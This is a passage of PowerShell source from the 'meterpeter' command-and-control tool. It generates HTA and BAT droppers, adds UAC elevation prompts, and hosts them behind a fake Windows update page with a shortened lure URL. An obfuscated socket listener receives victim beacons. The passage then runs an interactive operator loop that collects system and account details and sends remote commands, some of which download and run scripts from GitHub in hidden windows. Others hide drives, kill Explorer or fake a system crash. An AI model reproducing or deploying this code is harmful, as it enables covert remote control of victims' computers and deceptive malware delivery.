       cd $Bin
       #delete old files left behind by previous executions
       If(Test-Path -Path "$Dropper_Name.hta" -EA SilentlyContinue)
       {
          Remove-Item -Path "$Dropper_Name.hta" -Force
       }

       #Make sure HTA template exists before go any further
       If(-not(Test-Path -Path "Update.hta" -EA SilentlyContinue))
       {
          Write-Host "ERROR: file '${Bin}Update.hta' not found ..." -ForeGroundColor Red -BackGroundColor Black
          Write-Host "`n";exit #Exit @Meterpeter
       }
 
       #Replace the server ip addr + port on HTA template
       ((Get-Content -Path "Update.hta" -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path "Update.hta"

       #Embebed meterpter icon on HTA application?
       #iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null
       #Start-Process -WindowStyle hidden cmd.exe -ArgumentList "/R COPY /B meterpeter.ico+Update.hta $Dropper_Name.hta" -Wait

       #Compress HTA application and port the ZIP archive to 'webroot' directory!
       Compress-Archive -LiteralPath "$Dropper_Name.hta" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force

       #Revert original HTA to default to be used again
       ((Get-Content -Path "Update.hta" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "Update.hta"

       #Delete artifacts left behind
       #Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
       Remove-Item -Path "$Dropper_Name.hta" -EA SilentlyContinue -Force

       #return to meterpeter working directory (meterpeter)
       cd $IPATH
    
    }
    Else
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload BAT dropper script
       #>

       Copy-Item -Path "$Bin$Dropper_Name.bat" -Destination "${Bin}BACKUP.bat"|Out-Null
       ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
       ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Local_Host")|Set-Content -Path $Bin$Dropper_Name.bat;

       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated? (y|n)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {

          <#
          .SYNOPSIS
             Author: @r00t-3xp10it
             Helper - Execute Batch with administrator privileges?

          .NOTES
             This function add's a cmdline to the beggining of bat file that uses
             'Net Session' API to check for admin privs before executing powershell
             -runas on current process spawning a UAC dialogbox of confirmation.
          #>

          #TODO: run bat with admin privs ??? -> requires LanManServer (server) service active
          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
       }

       Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force;
       #Revert original BAT to default to be used again
       Remove-Item -Path "$Bin$Dropper_Name.bat" -Force
       Copy-Item -Path "${Bin}BACKUP.bat" -Destination "$Bin$Dropper_Name.bat"|Out-Null
       Remove-Item -Path "${Bin}BACKUP.bat" -Force

    }


  #write onscreen
  write-Host "[i] Send the URL generated to target to trigger download."
  Copy-Item -Path "${IPATH}\Mimiratz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
  Copy-Item -Path "${IPATH}\Mimiratz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
  Copy-Item -Path "${IPATH}\Mimiratz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
  ((Get-Content -Path "${APACHE}Update-KB5005101.html" -Raw) -Replace "henrythenavigator","$Dropper_Name")|Set-Content -Path "${APACHE}Update-KB5005101.html"

  Write-Host "[i] Attack Vector: http://$Local_Host/$Dropper_Name.html" -ForeGroundColor Black -BackGroundColor white;

  #Shorten Url function
  $Url = "http://$Local_Host/$Dropper_Name.html"
  $tinyUrlApi = 'http://tinyurl.com/api-create.php'
  $response = Invoke-WebRequest ("{0}?url={1}" -f $tinyUrlApi, $Url)
  $response.Content|Out-File -FilePath "$Env:TMP\sHORTENmE.meterpeter" -Force
  $GetShortenUrl = Get-Content -Path "$Env:TMP\sHORTENmE.meterpeter"
  Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
  Remove-Item -Path "$Env:TMP\sHORTENmE.meterpeter" -Force

}
$check = $Null;
$python_port = $Null;
$Server_port = $Null;
$Python_version = $Null;
## End of venom function


If($RunEXElevated -iMatch '^(y|yes)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Add UAC elevation to payload.ps1

   .NOTES
     This migth trigger av detection on payload (danger)
     @Ahmed_Ben_Mhamed uses the payload.PS1 of meterpeter C2
     to exploit targets over WAN networks, but UAC elevation
     its only available by default in droppers. (untill now) 
   #>

   $OLD = (Get-Content -Path "${IPATH}${payload_name}.ps1" -Raw)
   echo "`$Bi0s = (`"#Ru`"+`"nA#s`" -Join '') -replace '#',''" > "${IPATH}${payload_name}.ps1"
   echo "If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))" >> "${IPATH}${payload_name}.ps1"
   echo "{" >> "${IPATH}${payload_name}.ps1"
   echo "  Start-Process -WindowStyle hidden powershell.exe `"-File`",('`"{0}`"' -f `$MyInvocation.MyCommand.Path) -Verb `$Bi0s" >> "${IPATH}${payload_name}.ps1"
   echo "  exit" >> "${IPATH}${payload_name}.ps1"
   echo "}`n" >> "${IPATH}${payload_name}.ps1"
   echo "$OLD" >> "${IPATH}${payload_name}.ps1"
}


$ola = 'Creat' + 'eInstance' -join ''
$Bytes = [System.Byte[]]::$ola([System.Byte],1024);
Write-Host "[*] Listening on LPort: $Local_Port tcp";

## $Socket - Obfuscation
${/$.}=+$(  )  ;  ${).!}  =${/$.}  ;${#~}  =  ++  ${/$.}  ;  ${[/}  =(  ${/$.}  =${/$.}  +  ${#~}  )  ;${.-}  =  (  ${/$.}  =${/$.}+  ${#~}  );  ${.$)}=  (${/$.}  =  ${/$.}  +${#~}  )  ;${/@}  =  (${/$.}  =${/$.}+${#~}  )  ;${)/}=(${/$.}=${/$.}+${#~}  )  ;  ${#-*}  =(  ${/$.}=  ${/$.}+  ${#~});${;}=  (${/$.}  =${/$.}+  ${#~}  )  ;${``[@}  =  (${/$.}  =  ${/$.}+${#~}  )  ;${[}=  "["  +  "$(  @{}  )  "[${#-*}]+  "$(@{  })"[  "${#~}"  +  "${``[@}"]+"$(  @{}  )  "["${[/}"  +  "${).!}"]+  "$?"[${#~}  ]  +  "]"  ;${/$.}  =  "".("$(@{  })  "[  "${#~}${.$)}"]+"$(@{  })"["${#~}${)/}"]+"$(  @{  }  )  "[  ${).!}  ]  +"$(  @{  })  "[${.$)}]  +"$?  "[${#~}  ]+"$(  @{})  "[${.-}]  )  ;  ${/$.}=  "$(  @{  }  )  "["${#~}"+  "${.$)}"]  +  "$(  @{})  "[  ${.$)}  ]  +"${/$.}"[  "${[/}"  +"${#-*}"]  ;&${/$.}  ("  ${/$.}  (${[}${.-}${)/}+  ${[}${;}${.-}+  ${[}${#~}${#~}${#~}+${[}${``[@}${``[@}  +  ${[}${#~}${).!}${#-*}+  ${[}${#~}${).!}${#~}+${[}${#~}${#~}${)/}+${[}${.-}${[/}+  ${[}${)/}${#~}  +${[}${.-}${[/}+${[}${#-*}${;}  +${[}${#~}${).!}${#~}  +${[}${#~}${#~}${``[@}+  ${[}${.$)}${/@}+${[}${#-*}${``[@}+  ${[}${``[@}${;}+  ${[}${#~}${).!}${)/}  +${[}${#~}${).!}${#~}  +  ${[}${``[@}${``[@}  +${[}${#~}${#~}${)/}  +${[}${.-}${[/}  +${[}${;}${.-}+${[}${#~}${[/}${#~}  +${[}${#~}${#~}${/@}+${[}${#~}${#~}${)/}  +${[}${#~}${).!}${#~}+  ${[}${#~}${).!}${``[@}  +  ${[}${.$)}${)/}  +  ${[}${#-*}${;}  +  ${[}${#~}${).!}${#~}+  ${[}${#~}${#~}${)/}  +  ${[}${.$)}${)/}+  ${[}${;}${.-}  +  ${[}${#~}${#~}${#~}+${[}${``[@}${``[@}+${[}${#~}${).!}${#-*}+  ${[}${#~}${).!}${#~}  +  ${[}${#~}${#~}${)/}  +${[}${#~}${#~}${/@}  +${[}${.$)}${)/}  +  ${[}${;}${.$)}  +${[}${``[@}${``[@}  +  ${[}${#~}${#~}${[/}+  ${[}${#-*}${)/}+  ${[}${#~}${).!}${/@}+${[}${#~}${#~}${/@}  +  ${[}${#~}${#~}${)/}+${[}${#~}${).!}${#~}  +${[}${#~}${#~}${).!}  +  ${[}${#~}${).!}${#~}  +${[}${#~}${#~}${.$)}  +  ${[}${.$)}${).!}+${[}${.-}${``[@}  +${[}${.$)}${;}+${[}${.$)}${)/}  +${[}${.$)}${;}  +${[}${.$)}${)/}  +  ${[}${.$)}${;}  +  ${[}${.$)}${)/}+  ${[}${.$)}${;}  +  ${[}${.-}${``[@}  +${[}${.$)}${.$)}  +  ${[}${.-}${)/}+  ${[}${#-*}${)/}+${[}${#~}${#~}${#~}+  ${[}${``[@}${``[@}+${[}${``[@}${#-*}  +${[}${#~}${).!}${;}+  ${[}${``[@}${/@}  +${[}${;}${).!}  +${[}${#~}${#~}${#~}  +${[}${#~}${#~}${.$)}+${[}${#~}${#~}${)/}  +  ${[}${.$)}${#~}  +${[}${/@}${``[@}  )")

$Socket.Start();
$Client = $Socket.AcceptTcpClient();
$Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString
Write-Host "[-] Beacon received: $Remote_Host" -ForegroundColor Green

#Play sound on session creation
$PlayWav = New-Object System.Media.SoundPlayer
$PlayWav.SoundLocation = "${IPATH}\Mimiratz\theme\ConnectionAlert.wav"
$PlayWav.playsync();

$Stream = $Client.GetStream();
$WaitData = $False;
$Info = $Null;

$RhostWorkingDir = Char_Obf("(Get-location).Path");
$Processor = Char_Obf("(Get-WmiObject Win32_processor).Caption");
$Name = Char_Obf("(Get-WmiObject Win32_OperatingSystem).CSName");
$System = Char_Obf("(Get-WmiObject Win32_OperatingSystem).Caption");
$Version = Char_Obf("(Get-WmiObject Win32_OperatingSystem).Version");
$serial = Char_Obf("(Get-WmiObject Win32_OperatingSystem).SerialNumber");
$syst_dir = Char_Obf("(Get-WmiObject Win32_OperatingSystem).SystemDirectory");
$Architecture = Char_Obf("(Get-WmiObject Win32_OperatingSystem).OSArchitecture");
$WindowsDirectory = Char_Obf("(Get-WmiObject Win32_OperatingSystem).WindowsDirectory");
$RegisteredUser = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).RegisteredUser");
$BootUpTime = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime.ToString()");


#Sysinfo command at first time run (connection)
$Command = "cd `$Env:TMP;`"`n`n    DomainName     : `"+$Name+`"``n    RemoteHost     : `"+`"$Remote_Host`"+`"``n    BootUpTime     : `"+$BootUpTime+`"``n    RegisteredUser : `"+$RegisteredUser+`"``n    OP System      : `"+$System+`"``n    OP Version     : `"+$Version+`"``n    Architecture   : `"+$Architecture+`"``n    SystemDir      : `"+$syst_dir+`"``n    WorkingDir     : `"+$RhostWorkingDir+`"``n    ProcessorCPU   : `"+$Processor;echo `"`";Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable|ft -AutoSize|Select -SkipLast 1;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";


While($Client.Connected)
{
  If(-not ($WaitData))
  {
    If(-not ($Command))
    {
      $Flipflop = "False";
      Write-Host "`n - press 'Enter' to continue .." -NoNewline;
      $continue = Read-Host;
      Clear-Host;
      Write-Host $Modules;
      Write-Host "`n :meterpeter> " -NoNewline -ForeGroundColor Green;
      $Command = Read-Host;
    }


    If($Command -ieq "Modules")
    {
      Clear-Host;
      Write-Host "`n$Modules";
      $Command = $Null;
    }

    If($Command -ieq "Info")
    {
      Write-Host "`n$Info";
      $Command = $Null;
    }

    If($Command -ieq "Session")
    {
      ## Check if client (target machine) is still connected ..
      $ParseID = "$Local_Host"+":"+"$Local_Port" -Join ''
      $SessionID = netstat -ano | Select-String "$ParseID" | Select-Object -First 1
      $AllSettings = Get-NetAdapter | Select-Object * | Where-Object { $_.Status -iMatch '^(Up)$' }
      $Netdesc = ($AllSettings).InterfaceDescription
      $NetSped = ($AllSettings).LinkSpeed
      $NetAdpt = ($AllSettings).Name

      write-host "`n`n    Connection : " -NoNewline;
      write-host "$NetAdpt" -ForegroundColor DarkGray -NoNewline;
      write-host " LinkSpeed: " -NoNewline;
      write-host "$NetSped" -ForegroundColor DarkGray
      write-host "    Description: " -NoNewline
      write-host "$Netdesc" -ForegroundColor Red

      Write-Host "`n    Proto  Local Address          Foreign Address        State           PID" -ForeGroundColor green;
      Write-Host "    -----  -------------          ---------------        -----           ---";
      ## Display connections statistics
      If(-not($SessionID) -or $SessionID -eq " ")
      {
        Write-Host "    None Connections found                              (Client Disconnected)" -ForeGroundColor Red
      } Else {
        Write-Host "  $SessionID"
      }

      write-host ""
      $Command = $Null;
    }

    If($Command -ieq "Pranks")
    {
      write-host "`n`n   Description:" -ForegroundColor Yellow;
      write-host "   Remote pranks manager";
      write-host "`n`n   Modules        Description" -ForegroundColor green;
      write-host "   -------        -----------";
      write-host "   Msgbox         Spawn remote msgbox manager";
      write-host "   Speak          Make remote host speak one frase";
      write-host "   OpenUrl        Open\spawn URL in default browser";
      write-host "   GoogleX        Browser google easter eggs manager";
      write-host "   CriticalError  Prank that fakes a critical system error";
      write-host "   Nodrives       Hide All Drives (C:D:E:F:G) From Explorer";
      write-host "   Return         Return to Server Main Menu" -ForeGroundColor yellow
      write-host "`n`n :meterpeter:Pranks> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      If($choise -ieq "Nodrives")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   Module to enable\disable the display of drivers";
        write-host "   under Explorer (modify Explorer HKCU policy key)";
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     -------------------";
        write-host "   Disable   Hide Drives from explorer       " -NoNewline;
        write-host "Administrator" -ForegroundColor DarkYellow;
        write-host "   Enable    Show Drives in Explorer         "  -NoNewline;
        write-host "Administrator" -ForegroundColor DarkYellow;
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Pranks:NoDrives> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " * Hide All Drives (C:D:E:F:G) From Explorer .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' | select-Object NoDrives,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " * Display All Drives (C:D:E:F:G) In Explorer .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' -Force;Get-Item -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "clear")
        {
           $Command = $Null;
           $choise_two = $Null;
        }
      }
      If($choise -ieq "CriticalError")
      {
         $MaxInteractions = Read-Host " - How many times to loop prank?  "
         $DelayTime = Read-Host " - The delay time between loops?  "
         $bsodwallpaper = Read-Host " - Modify wallpaper to BSOD? (y|n)"
         If($bsodwallpaper -iMatch '^(n|no)$' -or $bsodwallpaper -eq $null)
         {
            $bsodwallpaper = "false"
         }
         Else
         {
            $bsodwallpaper = "true"            
         }

         If(-not($DelayTime) -or $DelayTime -eq $null){[int]$DelayTime = "200"}
         If(-not($MaxInteractions) -or $MaxInteractions -eq $null){[int]$MaxInteractions = "20"}
         Write-Host " * Faking a critical system error (bsod)" -ForegroundColor Green
         Write-Host "   => takes aprox 30 seconds to run`n`n" -ForegroundColor DarkYellow

         write-host "   Executing BSOD prank in background." -ForegroundColor Green
         write-host "   MaxInteractions:$MaxInteractions DelayTime:$DelayTime(sec)" -ForegroundColor DarkGray;
         If($bsodwallpaper -ieq "true")
         {
            write-host "   Wallpaper Path : `$Env:TMP\bsod.png" -ForegroundColor DarkGray;
            write-host "   Registry Hive  : HKCU\Control Panel\Desktop\Wallpaper" -ForegroundColor DarkGray;
            write-host "   RevertWallpaper: `$Env:TMP\RevertWallpaper.ps1`n`n" -ForegroundColor DarkYellow        
         }

         #Execute remote command
         $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1' -OutFile 'C2Prank.ps1'|Unblock-File;Start-Process -windowstyle hidden powershell -ArgumentList '-file C2Prank.ps1 -MaxInteractions $MaxInteractions -DelayTime $DelayTime -bsodwallpaper $bsodwallpaper'"
      }
      If($choise -ieq "msgbox")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   This module allow attacker to spawn a simple msgbox that auto-closes"
         write-host "   after a certain amount of pre-selected time, or spawn a msgbox that"
         write-host "   waits for comfirmation (press yes button on msgbox) to execute cmdline"
         write-host "   Remark: The msgbox 'auto-close time' its set in seconds" -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  -------------------";
         write-host "   simple   Spawn simple msgbox          UserLand";
         write-host "   cmdline  msgbox that exec cmdline     UserLand";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Pranks:Msgbox> " -NoNewline -ForeGroundColor Green;
         $msgbox_choise = Read-Host;
         If($msgbox_choise -ieq "Simple")
         {
            Write-Host " * Spawn simple remote msgbox" -ForegroundColor Green
            $MsgBoxClose = Read-Host " - Msgbox auto-close time"
            If(-not($MsgBoxClose) -or $MsgBoxClose -ieq $null)
            {
               $MsgBoxClose = "10"
               Write-Host "   => Error: wrong input, set demo to '$MsgBoxClose'" -ForegroundColor Red
            }

            $MsgBoxTitle = Read-Host " - Input the msgbox title"
            If(-not($MsgBoxTitle) -or $MsgBoxTitle -ieq $null)
            {
               $MsgBoxTitle = "MeterpeterC2"
               Write-Host "   => Error: wrong input, set demo to '$MsgBoxTitle'" -ForegroundColor Red
            }

            $MsgBoxText = Read-Host " - Input text to display "
            If(-not($MsgBoxText) -or $MsgBoxText -ieq $null)
            {
               $MsgBoxText = "Executing message box .."
               Write-Host "   => Error: wrong input, set demo to '$MsgBoxText'" -ForegroundColor Red
            }

            Write-Host "`n`n   Executing simple messagebox remote ..`n"
            $Command = "powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64)|Out-Null"
         }
         If($msgbox_choise -ieq "cmdline")
         {
            $MsgBoxClose = Read-Host " - Msgbox auto-close time"
            If(-not($MsgBoxClose) -or $MsgBoxClose -ieq $null)
            {
               $MsgBoxClose = "10"
               Write-Host "   => Error: wrong input, set demo to '$MsgBoxClose'" -ForegroundColor Red
            }

            $MsgBoxTitle = Read-Host " - Input the msgbox title"
            If(-not($MsgBoxTitle) -or $MsgBoxTitle -ieq $null)
            {
               $MsgBoxTitle = "MeterpeterC2"
               Write-Host "   => Error: wrong input, set demo to '$MsgBoxTitle'" -ForegroundColor Red
            }

            $MsgBoxText = Read-Host " - Input text to display "
            If(-not($MsgBoxText) -or $MsgBoxText -ieq $null)
            {
               $MsgBoxText = "Executing command"
               Write-Host "   => Error: wrong input, set demo to '$MsgBoxText'" -ForegroundColor Red
            }

            $MsgBoxAppli = Read-Host " - PS Cmdline to execute "
            If(-not($MsgBoxAppli) -or $MsgBoxAppli -ieq $null)
            {
               $MsgBoxAppli = "cmd /c start calc.exe"
               Write-Host "   => Error: wrong input, set demo to '$MsgBoxAppli'" -ForegroundColor Red
            }

            Write-Host " * Spawn msgbox that exec cmdline" -ForegroundColor Green
            $Command = "[int]`$MymsgBox = powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64);If(`$MymsgBox -eq 6){echo `"$MsgBoxAppli`"|Invoke-Expression;echo `"`n   Command '$MsgBoxAppli' executed.`"|Out-File msglogfile.log}Else{echo `"`n   Failed to execute '$MsgBoxAppli' command.`"|Out-File msglogfile.log};Get-Content -Path msglogfile.log;Remove-Item -Path msglogfile.log -Force"
         }
         If($msgbox_choise -ieq "Return" -or $msgbox_choise -ieq "cls" -or $msgbox_choise -ieq "modules" -or $msgbox_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $msgbox_choise = $Null;
         }
      }
      If($choise -ieq "Speak")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   This module makes remote host speak one sentence."
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     -------------------"
        write-host "   start     speak input sentence            UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Pranks:Speak> " -NoNewline -ForeGroundColor Green;
        $Speak_choise = Read-Host;
        If($Speak_choise -ieq "start")
        {
           write-host " - Input Frase for Remote-Host to Speak: " -NoNewline;
           $MYSpeak = Read-Host;
           write-host " * Executing speak prank." -ForegroundColor Green
           If(-not ($MYSpeak -ieq $False -or $MYSpeak -eq ""))
           {
             write-host ""
             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
           }
           Else
           {
             write-host "";
             $MYSpeak = "Next time dont forget to input the text ok?";
             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
           }
        }
        If($Speak_choise -ieq "Return" -or $Speak_choise -ieq "cls" -or $Speak_choise -ieq "Modules" -or $Speak_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Speak_choise = $Null;
        }
      }
      If($choise -ieq "OpenUrl" -or $choise -ieq "URL")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   This module allow users to open one url link on default webbrowser."
         write-host "   It will open the browser or a new tab if the browser its allready up."
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  -------------------"
         write-host "   Open     Url on default browser       UserLand";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Pranks:Url> " -NoNewline -ForeGroundColor Green;
         $url_choise = Read-Host;
         If($url_choise -ieq "Open")
         {
            $UrlLink = Read-Host " - Input URL to open"
            If(-not($UrlLink) -or $UrlLink -ieq $null)
            {
               $UrlLink = "https://mrdoob.com/projects/chromeexperiments/google-gravity"
               Write-Host "   => Error: wrong input, set demo to '$UrlLink'" -ForegroundColor Red
            }
            
            write-host ""
            $Command = "Start-Process -WindowStyle Maximized `"$UrlLink`"|Out-Null;If(`$? -eq `"True`"){echo `"   Successfuly open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Start-Sleep -Seconds 1;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}Else{echo `"   Fail to open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}" 
            $UrlLink = $null
         }
         If($url_choise -ieq "Return" -or $url_choise -ieq "cls" -or $url_choise -ieq "modules" -or $url_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $url_choise = $Null;
         }
      }
      If($choise -ieq "GoogleX")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   Opens the default WebBrowser in sellected easter egg";
        write-host "   Or opens a new Tab if the browser its allready open.";
        write-host "`n`n   Modules     Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------     -----------                     -------------------"
        write-host "   gravity     Open Google-Gravity             UserLand";
        write-host "   sphere      Open Google-Sphere              UserLand";
        write-host "   rotate      Rotate webpage 360º             UserLand";
        write-host "   mirror      Open Google-Mirror              UserLand";
        write-host "   teapot      Open Google-teapot              UserLand";
        write-host "   invaders    Open Invaders-Game              UserLand";
        write-host "   pacman      Open Pacman-Game                UserLand";
        write-host "   rush        Open Google-Zerg-Rush           UserLand";
        write-host "   moon        Open Google-Moon                UserLand";
        write-host "   terminal    Open Google-terminal            UserLand";
        write-host "   trexgame    Open Google-tRexgame            UserLand";
        write-host "   googlespace Open google-space               UserLand";
        write-host "   kidscoding  Open Google-kidscoding          UserLand";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Pranks:GoogleX> " -NoNewline -ForeGroundColor Green;
        $EasterEgg = Read-Host;
        If($EasterEgg -ieq "terminal")
        {
           write-host "`n";
           $cmdline = "https://elgoog.im/terminal"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "trexgame")
        {
           write-host "`n";
           $cmdline = "https://elgoog.im/t-rex"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "kidscoding")
        {
           write-host "`n";
           $cmdline = "https://www.google.com/logos/2017/logo17/logo17.html"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "googlespace")
        {
           write-host "`n";
           $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-space/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "teapot")
        {
           write-host "`n";
           $cmdline = "https://www.google.com/teapot"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "sphere")
        {
           write-host "`n";
           $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-sphere"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "gravity")
        {
           write-host "`n";
           $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-gravity"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "rotate")
        {
           write-host " - Execute it how many times? : " -NoNewline;
           $LoopRange = Read-Host;
           If(-not($LoopRange) -or $LoopRange -eq $null)
           {
              $LoopRange = "1"
           }

           If($LoopRange -gt 1)
           {

              write-host " - Secs before the next loop? : " -NoNewline;
              $LoopDelay = Read-Host;
              If(-not($LoopDelay) -or $LoopDelay -eq $null)
              {
                 $LoopDelay = "20"
              }
           }
           Else
           {
              $LoopDelay = "5"
           }

           write-host "`n";
           $cmdline = "https://www.google.com/search?q=do+a+barrel+roll"
           $Command = "cd `$Env:TMP;iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1`" -OutFile `"`$Env:TMP\Prank2.ps1`"|Unblock-File;Start-Process -WindowStyle Hidden powershell -ArgumentList `"powershell -File `$Env:TMP\Prank2.ps1 -StartDelay '3' -LoopRange $LoopRange -LoopDelay $LoopDelay`";echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "rush")
        {
           write-host "`n";
           $cmdline = "https://elgoog.im/zergrush/"
